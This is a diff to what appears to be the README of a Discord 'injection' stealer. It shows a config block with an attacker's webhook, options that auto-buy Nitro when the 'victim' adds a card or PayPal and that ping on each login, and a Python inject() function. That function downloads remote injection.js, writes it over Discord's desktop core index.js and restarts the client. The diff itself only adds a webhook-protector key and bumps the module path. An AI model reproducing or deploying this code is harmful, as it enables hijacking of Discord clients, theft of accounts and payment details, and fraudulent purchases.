@@ -81,6 +81,7 @@ Copy the raw url of the [injection](./injection.js) and then paste it in your co
 ```javascript
 const config = {
     webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
+    webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
     auto_buy_nitro: true, //automatically buys nitro when the victim adds credit card or paypal account or tries to buy nitro themselves
     ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
     ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
@@ -112,7 +113,7 @@ def inject():
                 if re.match(r'app-(\d*\.\d*)*', __dir):
                     abspath = os.path.abspath(os.getenv('localappdata')+os.sep+_dir+os.sep+__dir)
                     f = requests.get("https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js").text.replace("%WEBHOOK%", webhook)
-                    with open(abspath+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
+                    with open(abspath+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                         indexFile.write(f)
                     os.startfile(abspath+os.sep+_dir+'.exe')
 
